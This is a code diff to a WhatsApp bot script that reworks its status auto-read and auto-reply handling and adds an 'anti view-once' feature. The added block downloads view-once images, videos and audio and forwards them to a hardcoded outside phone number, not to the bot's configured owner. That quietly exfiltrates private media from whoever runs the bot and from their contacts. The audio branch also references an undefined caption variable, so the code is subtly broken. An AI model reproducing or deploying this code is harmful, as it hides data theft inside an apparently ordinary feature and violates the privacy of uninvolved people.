@@ -84,21 +84,27 @@ mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message
 if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
 await conn.readMessages([mek.key]) 
 
-}
-	//=============auto-like==========
-conn.ev.on('messages.upsert', async(mek) => {
-    mek = mek.messages[0];
-    if (!mek.message) return;
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
-
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
-        const user = mek.key.participant; // The user who posted the status
-        const text = `${config.AUTO_STATUS__MSG}`; // Message to send as a reply
-        await conn.sendMessage(user, { 
-            text: text, 
-            react: { text: '💜', key: mek.key } // React to the status
-        }, { quoted: mek });
-
+    }        
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS__MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+      let jawadik = mek.message.viewOnceMessageV2
+      let jawadik1 = mek.mtype === "viewOnceMessage"
+  if (jawadik && config.ANTI_VV === "true") {
+    if (jawadik.message.imageMessage) {
+    let cap = jawadik.message.imageMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
+    return conn.sendMessage("923146190772@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.videoMessage) {
+    let cap = jawadik.message.videoMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
+    return conn.sendMessage("923146190772@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.audioMessage) {
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
+    return conn.sendMessage("923146190772@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+		  }
 
 	
 }
